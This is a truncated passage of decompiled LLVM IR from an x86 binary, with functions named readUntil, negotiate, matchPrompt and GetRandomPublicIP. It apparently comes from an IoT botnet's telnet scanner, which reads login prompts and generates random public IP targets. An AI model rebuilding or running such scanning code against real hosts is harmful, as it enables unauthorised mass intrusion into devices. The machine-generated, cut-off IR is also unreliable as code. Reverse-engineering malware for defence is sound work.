  %v1_8049a07 = icmp eq i1 %v15_8049a05, false
  br i1 %v1_8049a07, label %dec_label_pc_8049a12, label %dec_label_pc_8049a3f

dec_label_pc_8049a12:                             ; preds = %dec_label_pc_80499ea
  %v4_8049a12 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049a15

dec_label_pc_8049a15:                             ; preds = %entry, %dec_label_pc_8049a12
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_8049a12 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_8049a12, %dec_label_pc_8049a12 ]
  %v3_8049a29 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f3c.37, i32 0, i32 0))
  %v7_8049a30 = icmp ult i32 %storemerge3, %v3_8049a29
  br i1 %v7_8049a30, label %dec_label_pc_8049986.preheader, label %dec_label_pc_8049a3f

dec_label_pc_8049986.preheader:                   ; preds = %dec_label_pc_8049a15
  %v7_804998c25 = icmp slt i32 %stack_var_-12.1, %v1_804996c
  br i1 %v7_804998c25, label %dec_label_pc_804998e, label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge

dec_label_pc_8049a3f:                             ; preds = %dec_label_pc_8049a15, %dec_label_pc_80499ea
  %storemerge = phi i32 [ 1, %dec_label_pc_80499ea ], [ 0, %dec_label_pc_8049a15 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049993, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8057f3c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a15, { 1, 0 }
  uselistorder label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049a8e = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049aa8 = urem i32 %arg1, 32
  %v9_8049aab = shl i32 1, %v1_8049aa8
  %v1_8049ab6 = add i32 %arg1, 1
  %v2_8049aba = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049b89 = inttoptr i32 %arg2 to i8*
  %v4_8049b95 = icmp eq i32 %arg3, 0
  %v1_8049bb640 = add i32 %arg8, 2
  %v5_8049bbc43 = icmp slt i32 %v1_8049bb640, %arg7
  br i1 %v5_8049bbc43, label %dec_label_pc_8049bbe.lr.ph, label %dec_label_pc_8049bec

dec_label_pc_8049bbe.lr.ph:                       ; preds = %entry
  %v2_8049aa2 = udiv i32 %arg1, 32
  %v2_8049aab = mul nuw nsw i32 %v2_8049aa2, 4
  %v3_8049aab = add nsw i32 %v2_8049aab, -156
  %v5_8049ae0 = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_8049bbe

dec_label_pc_8049a84:                             ; preds = %dec_label_pc_8049bcc, %dec_label_pc_8049bbe
  store i32 %v2_8049a8e, i32* @edi, align 4
  %v5_8049a95 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8049aab = load i32, i32* @ebp, align 4
  %v4_8049aab = add i32 %v3_8049aab, %v0_8049aab
  %v5_8049aab = inttoptr i32 %v4_8049aab to i32*
  %v6_8049aab = load i32, i32* %v5_8049aab, align 4
  %v12_8049aab = or i32 %v6_8049aab, %v9_8049aab
  store i32 %v12_8049aab, i32* %v5_8049aab, align 4
  %v5_8049acd = call i32 @__libc_select(i32 %v1_8049ab6, i32 %v2_8049a8e, i32 0, i32 0, i32 %v2_8049aba)
  %tmp35 = icmp slt i32 %v5_8049acd, 1
  br i1 %tmp35, label %dec_label_pc_8049bec, label %dec_label_pc_8049add

dec_label_pc_8049add:                             ; preds = %dec_label_pc_8049a84
  %v6_8049ae0 = add i32 %stack_var_-32.044, %v5_8049ae0
  %v5_8049ae3 = inttoptr i32 %v6_8049ae0 to i8*
  %v5_8049af0 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049ae0, i32 1, i32 0)
  %v13_8049afb = icmp eq i32 %v5_8049af0, -1
  br i1 %v13_8049afb, label %dec_label_pc_8049b07, label %dec_label_pc_8049b01

dec_label_pc_8049b01:                             ; preds = %dec_label_pc_8049add
  %v4_8049b01 = icmp eq i32 %v5_8049af0, 0
  %v1_8049b05 = icmp eq i1 %v4_8049b01, false
  br i1 %v1_8049b05, label %dec_label_pc_8049b16, label %dec_label_pc_8049b07

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049b01, %dec_label_pc_8049add
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b16:                             ; preds = %dec_label_pc_8049b01
  %v5_8049b19 = add i32 %v5_8049af0, %stack_var_-32.044
  %v2_8049b1f = load i8, i8* %v5_8049ae3, align 1
  %v11_8049b21 = icmp eq i8 %v2_8049b1f, -1
  %v1_8049b23 = icmp eq i1 %v11_8049b21, false
  br i1 %v1_8049b23, label %dec_label_pc_8049b80, label %dec_label_pc_8049b25

dec_label_pc_8049b25:                             ; preds = %dec_label_pc_8049b16
  %v1_8049b28 = add i32 %v6_8049ae0, 1
  %v5_8049b31 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049b28, i32 2, i32 0)
  %v13_8049b3c = icmp eq i32 %v5_8049b31, -1
  br i1 %v13_8049b3c, label %dec_label_pc_8049b48, label %dec_label_pc_8049b42

dec_label_pc_8049b42:                             ; preds = %dec_label_pc_8049b25
  %v4_8049b42 = icmp eq i32 %v5_8049b31, 0
  %v1_8049b46 = icmp eq i1 %v4_8049b42, false
  br i1 %v1_8049b46, label %dec_label_pc_8049b57, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b42, %dec_label_pc_8049b25
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b57:                             ; preds = %dec_label_pc_8049b42
  %v5_8049b5a = add i32 %v5_8049b31, %v5_8049b19
  %v3_8049b68 = call i32 @negotiate(i32 %arg1, i32 %v6_8049ae0, i32 3)
  %v1_8049b70 = icmp eq i32 %v3_8049b68, 0
  %v1_8049b72 = icmp eq i1 %v1_8049b70, false
  br i1 %v1_8049b72, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b74

dec_label_pc_8049bb3.backedge:                    ; preds = %dec_label_pc_8049b57, %dec_label_pc_8049b95, %dec_label_pc_8049b9b
  %stack_var_-32.0.be = phi i32 [ %v5_8049b19, %dec_label_pc_8049b95 ], [ %v5_8049b19, %dec_label_pc_8049b9b ], [ %v5_8049b5a, %dec_label_pc_8049b57 ]
  %v1_8049bb6 = add i32 %stack_var_-32.0.be, 2
  %v5_8049bbc = icmp slt i32 %v1_8049bb6, %arg7
  br i1 %v5_8049bbc, label %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, label %dec_label_pc_8049bec

dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge: ; preds = %dec_label_pc_8049bb3.backedge
  %v3_8049bbe.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049bbe

dec_label_pc_8049b74:                             ; preds = %dec_label_pc_8049b57
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b80:                             ; preds = %dec_label_pc_8049b16
  %v3_8049b89 = call i32 @strstr(i32 %v5_8049ae0, i8* %v2_8049b89)
  %v1_8049b91 = icmp eq i32 %v3_8049b89, 0
  %v1_8049b93 = icmp eq i1 %v1_8049b91, false
  br i1 %v1_8049b93, label %dec_label_pc_8049be0, label %dec_label_pc_8049b95

dec_label_pc_8049b95:                             ; preds = %dec_label_pc_8049b80
  br i1 %v4_8049b95, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b9b

dec_label_pc_8049b9b:                             ; preds = %dec_label_pc_8049b95
  %v3_8049b9e = call i32 @matchPrompt(i8* %arg6)
  %v1_8049ba6 = icmp eq i32 %v3_8049b9e, 0
  br i1 %v1_8049ba6, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049be0

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, %dec_label_pc_8049bbe.lr.ph
  %v3_8049bbe = phi i32 [ %arg4, %dec_label_pc_8049bbe.lr.ph ], [ %v3_8049bbe.pre, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049bbe.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %tmp36 = icmp slt i32 %v3_8049bbe, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8049a84, label %dec_label_pc_8049bcc

dec_label_pc_8049bcc:                             ; preds = %dec_label_pc_8049bbe
  br i1 %tmp39, label %dec_label_pc_8049a84, label %dec_label_pc_8049bec

dec_label_pc_8049be0:                             ; preds = %dec_label_pc_8049b9b, %dec_label_pc_8049b80
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bec:                             ; preds = %dec_label_pc_8049bb3.backedge, %dec_label_pc_8049bcc, %dec_label_pc_8049a84, %entry
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bf6:                             ; preds = %dec_label_pc_8049be0, %dec_label_pc_8049b74, %dec_label_pc_8049b48, %dec_label_pc_8049b07, %dec_label_pc_8049bec
  %v3_8049bf6 = phi i32 [ 1, %dec_label_pc_8049be0 ], [ 0, %dec_label_pc_8049b74 ], [ 0, %dec_label_pc_8049b48 ], [ 0, %dec_label_pc_8049b07 ], [ 0, %dec_label_pc_8049bec ]
  ret i32 %v3_8049bf6

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_8049b31, { 0, 2, 1 }
  uselistorder i32 %v5_8049af0, { 0, 2, 1 }
  uselistorder i32 %v5_8049ae0, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049bf6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049bec, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bb3.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c04 = load i32, i32* @ebx, align 4
  store i32 %v0_8049c04, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_805b537.38 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805b538.39 to i8*), align 8
  store i8 0, i8* @global_var_805b539.40, align 1
  store i8 0, i8* @global_var_805b53a.41, align 2
  %v1_8049c24 = call i32 @random()
  %v2_8049c34 = ashr i32 %v1_8049c24, 31
  %v2_8049c37 = zext i32 %v1_8049c24 to i64
  %v4_8049c37 = zext i32 %v2_8049c34 to i64
  %v5_8049c37 = mul nuw i64 %v4_8049c37, 4294967296
  %v6_8049c37 = or i64 %v5_8049c37, %v2_8049c37
  %v10_8049c37 = srem i64 %v6_8049c37, 255
  %v11_8049c37 = trunc i64 %v10_8049c37 to i32
  store i32 %v11_8049c37, i32* @eax, align 4
  %v1_8049c3b = trunc i64 %v10_8049c37 to i8
  store i8 %v1_8049c3b, i8* bitcast (i32* @global_var_805b537.38 to i8*), align 4
  %v0_8049c40 = call i32 @random()
  %v2_8049c50 = ashr i32 %v0_8049c40, 31
  %v2_8049c53 = zext i32 %v0_8049c40 to i64
  %v4_8049c53 = zext i32 %v2_8049c50 to i64
  %v5_8049c53 = mul nuw i64 %v4_8049c53, 4294967296
  %v6_8049c53 = or i64 %v5_8049c53, %v2_8049c53
  %v10_8049c53 = srem i64 %v6_8049c53, 255
  %v11_8049c53 = trunc i64 %v10_8049c53 to i32
  store i32 %v11_8049c53, i32* @eax, align 4
  %v1_8049c57 = trunc i64 %v10_8049c53 to i8
  store i8 %v1_8049c57, i8* bitcast (i32* @global_var_805b538.39 to i8*), align 8
  %v0_8049c5c = call i32 @random()
  %v2_8049c6c = ashr i32 %v0_8049c5c, 31
  %v2_8049c6f = zext i32 %v0_8049c5c to i64
  %v4_8049c6f = zext i32 %v2_8049c6c to i64
  %v5_8049c6f = mul nuw i64 %v4_8049c6f, 4294967296
  %v6_8049c6f = or i64 %v5_8049c6f, %v2_8049c6f
  %v10_8049c6f = srem i64 %v6_8049c6f, 255
  %v11_8049c6f = trunc i64 %v10_8049c6f to i32
  store i32 %v11_8049c6f, i32* @eax, align 4
  %v1_8049c73 = trunc i64 %v10_8049c6f to i8
  store i8 %v1_8049c73, i8* @global_var_805b539.40, align 1
  %v0_8049c78 = call i32 @random()
  %v2_8049c88 = ashr i32 %v0_8049c78, 31
  %v2_8049c8b = zext i32 %v0_8049c78 to i64
  %v4_8049c8b = zext i32 %v2_8049c88 to i64
  %v5_8049c8b = mul nuw i64 %v4_8049c8b, 4294967296
  %v6_8049c8b = or i64 %v5_8049c8b, %v2_8049c8b
  %v10_8049c8b = srem i64 %v6_8049c8b, 255
  %v11_8049c8b = trunc i64 %v10_8049c8b to i32
  store i32 %v11_8049c8b, i32* @eax, align 4
  %v1_8049c8f = trunc i64 %v10_8049c8b to i8
  store i8 %v1_8049c8f, i8* @global_var_805b53a.41, align 2
  %v0_8049c94 = call i32 @random()
  %v2_8049ca4 = ashr i32 %v0_8049c94, 31
  %v2_8049ca7 = zext i32 %v0_8049c94 to i64
  %v4_8049ca7 = zext i32 %v2_8049ca4 to i64
  %v5_8049ca7 = mul nuw i64 %v4_8049ca7, 4294967296
  %v6_8049ca7 = or i64 %v5_8049ca7, %v2_8049ca7
  %v10_8049ca7 = srem i64 %v6_8049ca7, 208
  %v11_8049ca7 = trunc i64 %v10_8049ca7 to i32
  store i32 %v11_8049ca7, i32* @edx, align 4
  %v4_8049cac = icmp eq i32 %v11_8049ca7, 0
  %v1_8049cb0 = icmp eq i1 %v4_8049cac, false
  br i1 %v1_8049cb0, label %dec_label_pc_8049cdc, label %dec_label_pc_8049cb2

dec_label_pc_8049cb2:                             ; preds = %entry
  %v0_8049cb2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049cb2 = zext i8 %v0_8049cb2 to i32
  store i32 %v1_8049cb2, i32* @edx, align 4
  %v0_8049cbe = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049cbe = zext i8 %v0_8049cbe to i32
  %v2_8049ccd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ccd, i32* @ebx, align 4
  %v5_8049cd4 = call i32 @szprintf(i32 %v2_8049ccd, i32 ptrtoint ([12 x i8]* @global_var_8057f43.42 to i32), i32 %v1_8049cbe, i32 %v1_8049cb2)
  br label %dec_label_pc_8049cdc

dec_label_pc_8049cdc:                             ; preds = %entry, %dec_label_pc_8049cb2
  %v12_8049cdc = icmp eq i32 %v11_8049ca7, 1
  %v1_8049ce0 = icmp eq i1 %v12_8049cdc, false
  br i1 %v1_8049ce0, label %dec_label_pc_8049d0c, label %dec_label_pc_8049ce2

dec_label_pc_8049ce2:                             ; preds = %dec_label_pc_8049cdc
  %v0_8049ce2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049ce2 = zext i8 %v0_8049ce2 to i32
  store i32 %v1_8049ce2, i32* @edx, align 4
  %v0_8049cee = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049cee = zext i8 %v0_8049cee to i32
  %v2_8049cfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cfd, i32* @ebx, align 4
  %v5_8049d04 = call i32 @szprintf(i32 %v2_8049cfd, i32 ptrtoint ([14 x i8]* @global_var_8057f4f.43 to i32), i32 %v1_8049cee, i32 %v1_8049ce2)
  br label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %dec_label_pc_8049cdc, %dec_label_pc_8049ce2
  %v12_8049d0c = icmp eq i32 %v11_8049ca7, 2
  %v1_8049d10 = icmp eq i1 %v12_8049d0c, false
  br i1 %v1_8049d10, label %dec_label_pc_8049d3c, label %dec_label_pc_8049d12

dec_label_pc_8049d12:                             ; preds = %dec_label_pc_8049d0c
  %v0_8049d12 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049d12 = zext i8 %v0_8049d12 to i32
  store i32 %v1_8049d12, i32* @edx, align 4
  %v0_8049d1e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049d1e = zext i8 %v0_8049d1e to i32
  %v2_8049d2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d2d, i32* @ebx, align 4
  %v5_8049d34 = call i32 @szprintf(i32 %v2_8049d2d, i32 ptrtoint ([11 x i8]* @global_var_8057f5d.44 to i32), i32 %v1_8049d1e, i32 %v1_8049d12)
  br label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %dec_label_pc_8049d0c, %dec_label_pc_8049d12
  %v12_8049d3c = icmp eq i32 %v11_8049ca7, 3
  %v1_8049d40 = icmp eq i1 %v12_8049d3c, false
  br i1 %v1_8049d40, label %dec_label_pc_8049d6c, label %dec_label_pc_8049d42

dec_label_pc_8049d42:                             ; preds = %dec_label_pc_8049d3c
  %v0_8049d42 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049d42 = zext i8 %v0_8049d42 to i32
  store i32 %v1_8049d42, i32* @edx, align 4
  %v0_8049d4e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049d4e = zext i8 %v0_8049d4e to i32
  %v2_8049d5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5d, i32* @ebx, align 4
  %v5_8049d64 = call i32 @szprintf(i32 %v2_8049d5d, i32 ptrtoint ([13 x i8]* @global_var_8057f68.45 to i32), i32 %v1_8049d4e, i32 %v1_8049d42)
  br label %dec_label_pc_8049d6c

dec_label_pc_8049d6c:                             ; preds = %dec_label_pc_8049d3c, %dec_label_pc_8049d42
  %v12_8049d6c = icmp eq i32 %v11_8049ca7, 4
  %v1_8049d70 = icmp eq i1 %v12_8049d6c, false
  br i1 %v1_8049d70, label %dec_label_pc_8049d9c, label %dec_label_pc_8049d72

dec_label_pc_8049d72:                             ; preds = %dec_label_pc_8049d6c
  %v0_8049d72 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049d72 = zext i8 %v0_8049d72 to i32
  store i32 %v1_8049d72, i32* @edx, align 4
  %v0_8049d7e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049d7e = zext i8 %v0_8049d7e to i32
  %v2_8049d8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d8d, i32* @ebx, align 4
  %v5_8049d94 = call i32 @szprintf(i32 %v2_8049d8d, i32 ptrtoint ([11 x i8]* @global_var_8057f75.46 to i32), i32 %v1_8049d7e, i32 %v1_8049d72)
  br label %dec_label_pc_8049d9c

dec_label_pc_8049d9c:                             ; preds = %dec_label_pc_8049d6c, %dec_label_pc_8049d72
  %v12_8049d9c = icmp eq i32 %v11_8049ca7, 5
  %v1_8049da0 = icmp eq i1 %v12_8049d9c, false
  br i1 %v1_8049da0, label %dec_label_pc_8049dcc, label %dec_label_pc_8049da2

dec_label_pc_8049da2:                             ; preds = %dec_label_pc_8049d9c
  %v0_8049da2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049da2 = zext i8 %v0_8049da2 to i32
  store i32 %v1_8049da2, i32* @edx, align 4
  %v0_8049dae = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049dae = zext i8 %v0_8049dae to i32
  %v2_8049dbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dbd, i32* @ebx, align 4
  %v5_8049dc4 = call i32 @szprintf(i32 %v2_8049dbd, i32 ptrtoint ([13 x i8]* @global_var_8057f80.47 to i32), i32 %v1_8049dae, i32 %v1_8049da2)
  br label %dec_label_pc_8049dcc

dec_label_pc_8049dcc:                             ; preds = %dec_label_pc_8049d9c, %dec_label_pc_8049da2
  %v12_8049dcc = icmp eq i32 %v11_8049ca7, 6
  %v1_8049dd0 = icmp eq i1 %v12_8049dcc, false
  br i1 %v1_8049dd0, label %dec_label_pc_8049dfc, label %dec_label_pc_8049dd2

dec_label_pc_8049dd2:                             ; preds = %dec_label_pc_8049dcc
  %v0_8049dd2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049dd2 = zext i8 %v0_8049dd2 to i32
  store i32 %v1_8049dd2, i32* @edx, align 4
  %v0_8049dde = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049dde = zext i8 %v0_8049dde to i32
  %v2_8049ded = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ded, i32* @ebx, align 4
  %v5_8049df4 = call i32 @szprintf(i32 %v2_8049ded, i32 ptrtoint ([12 x i8]* @global_var_8057f8d.48 to i32), i32 %v1_8049dde, i32 %v1_8049dd2)
  br label %dec_label_pc_8049dfc

dec_label_pc_8049dfc:                             ; preds = %dec_label_pc_8049dcc, %dec_label_pc_8049dd2
  %v12_8049dfc = icmp eq i32 %v11_8049ca7, 7
  %v1_8049e00 = icmp eq i1 %v12_8049dfc, false
  br i1 %v1_8049e00, label %dec_label_pc_8049e2c, label %dec_label_pc_8049e02

dec_label_pc_8049e02:                             ; preds = %dec_label_pc_8049dfc
  %v0_8049e02 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049e02 = zext i8 %v0_8049e02 to i32
  store i32 %v1_8049e02, i32* @edx, align 4
  %v0_8049e0e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049e0e = zext i8 %v0_8049e0e to i32
  %v2_8049e1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e1d, i32* @ebx, align 4
  %v5_8049e24 = call i32 @szprintf(i32 %v2_8049e1d, i32 ptrtoint ([13 x i8]* @global_var_8057f99.49 to i32), i32 %v1_8049e0e, i32 %v1_8049e02)
  br label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049dfc, %dec_label_pc_8049e02
  %v12_8049e2c = icmp eq i32 %v11_8049ca7, 8
  %v1_8049e30 = icmp eq i1 %v12_8049e2c, false
  br i1 %v1_8049e30, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e32

dec_label_pc_8049e32:                             ; preds = %dec_label_pc_8049e2c
  %v0_8049e32 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049e32 = zext i8 %v0_8049e32 to i32
  store i32 %v1_8049e32, i32* @edx, align 4
  %v0_8049e3e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049e3e = zext i8 %v0_8049e3e to i32
  %v2_8049e4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e4d, i32* @ebx, align 4
  %v5_8049e54 = call i32 @szprintf(i32 %v2_8049e4d, i32 ptrtoint ([13 x i8]* @global_var_8057fa6.50 to i32), i32 %v1_8049e3e, i32 %v1_8049e32)
  br label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e2c, %dec_label_pc_8049e32
  %v12_8049e5c = icmp eq i32 %v11_8049ca7, 9
  %v1_8049e60 = icmp eq i1 %v12_8049e5c, false
  br i1 %v1_8049e60, label %dec_label_pc_8049e8c, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e5c
  %v0_8049e62 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049e62 = zext i8 %v0_8049e62 to i32
  store i32 %v1_8049e62, i32* @edx, align 4
  %v0_8049e6e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049e6e = zext i8 %v0_8049e6e to i32
  %v2_8049e7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e7d, i32* @ebx, align 4
  %v5_8049e84 = call i32 @szprintf(i32 %v2_8049e7d, i32 ptrtoint ([13 x i8]* @global_var_8057fb3.51 to i32), i32 %v1_8049e6e, i32 %v1_8049e62)
  br label %dec_label_pc_8049e8c

dec_label_pc_8049e8c:                             ; preds = %dec_label_pc_8049e5c, %dec_label_pc_8049e62
  %v12_8049e8c = icmp eq i32 %v11_8049ca7, 10
  %v1_8049e90 = icmp eq i1 %v12_8049e8c, false
  br i1 %v1_8049e90, label %dec_label_pc_8049ebc, label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e8c
  %v0_8049e92 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049e92 = zext i8 %v0_8049e92 to i32
  store i32 %v1_8049e92, i32* @edx, align 4
  %v0_8049e9e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049e9e = zext i8 %v0_8049e9e to i32
  %v2_8049ead = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ead, i32* @ebx, align 4
  %v5_8049eb4 = call i32 @szprintf(i32 %v2_8049ead, i32 ptrtoint ([14 x i8]* @global_var_8057fc0.52 to i32), i32 %v1_8049e9e, i32 %v1_8049e92)
  br label %dec_label_pc_8049ebc

dec_label_pc_8049ebc:                             ; preds = %dec_label_pc_8049e8c, %dec_label_pc_8049e92
  %v12_8049ebc = icmp eq i32 %v11_8049ca7, 11
  %v1_8049ec0 = icmp eq i1 %v12_8049ebc, false
  br i1 %v1_8049ec0, label %dec_label_pc_8049eec, label %dec_label_pc_8049ec2

dec_label_pc_8049ec2:                             ; preds = %dec_label_pc_8049ebc
  %v0_8049ec2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049ec2 = zext i8 %v0_8049ec2 to i32
  store i32 %v1_8049ec2, i32* @edx, align 4
  %v0_8049ece = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049ece = zext i8 %v0_8049ece to i32
  %v2_8049edd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049edd, i32* @ebx, align 4
  %v5_8049ee4 = call i32 @szprintf(i32 %v2_8049edd, i32 ptrtoint ([11 x i8]* @global_var_8057fce.53 to i32), i32 %v1_8049ece, i32 %v1_8049ec2)
  br label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049ebc, %dec_label_pc_8049ec2
  %v12_8049eec = icmp eq i32 %v11_8049ca7, 12
  %v1_8049ef0 = icmp eq i1 %v12_8049eec, false
  br i1 %v1_8049ef0, label %dec_label_pc_8049f1c, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049eec
  %v0_8049ef2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049ef2 = zext i8 %v0_8049ef2 to i32
  store i32 %v1_8049ef2, i32* @edx, align 4
  %v0_8049efe = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049efe = zext i8 %v0_8049efe to i32
  %v2_8049f0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0d, i32* @ebx, align 4
  %v5_8049f14 = call i32 @szprintf(i32 %v2_8049f0d, i32 ptrtoint ([13 x i8]* @global_var_8057fd9.54 to i32), i32 %v1_8049efe, i32 %v1_8049ef2)
  br label %dec_label_pc_8049f1c

dec_label_pc_8049f1c:                             ; preds = %dec_label_pc_8049eec, %dec_label_pc_8049ef2
  %v12_8049f1c = icmp eq i32 %v11_8049ca7, 13
  %v1_8049f20 = icmp eq i1 %v12_8049f1c, false
  br i1 %v1_8049f20, label %dec_label_pc_8049f4c, label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %dec_label_pc_8049f1c
  %v0_8049f22 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049f22 = zext i8 %v0_8049f22 to i32
  store i32 %v1_8049f22, i32* @edx, align 4
  %v0_8049f2e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049f2e = zext i8 %v0_8049f2e to i32
  %v2_8049f3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3d, i32* @ebx, align 4
  %v5_8049f44 = call i32 @szprintf(i32 %v2_8049f3d, i32 ptrtoint ([13 x i8]* @global_var_8057fe6.55 to i32), i32 %v1_8049f2e, i32 %v1_8049f22)
  br label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f1c, %dec_label_pc_8049f22
  %v12_8049f4c = icmp eq i32 %v11_8049ca7, 14
  %v1_8049f50 = icmp eq i1 %v12_8049f4c, false
  br i1 %v1_8049f50, label %dec_label_pc_8049f7c, label %dec_label_pc_8049f52

dec_label_pc_8049f52:                             ; preds = %dec_label_pc_8049f4c
  %v0_8049f52 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049f52 = zext i8 %v0_8049f52 to i32
  store i32 %v1_8049f52, i32* @edx, align 4
  %v0_8049f5e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049f5e = zext i8 %v0_8049f5e to i32
  %v2_8049f6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f6d, i32* @ebx, align 4
  %v5_8049f74 = call i32 @szprintf(i32 %v2_8049f6d, i32 ptrtoint ([13 x i8]* @global_var_8057ff3.56 to i32), i32 %v1_8049f5e, i32 %v1_8049f52)
  br label %dec_label_pc_8049f7c

dec_label_pc_8049f7c:                             ; preds = %dec_label_pc_8049f4c, %dec_label_pc_8049f52
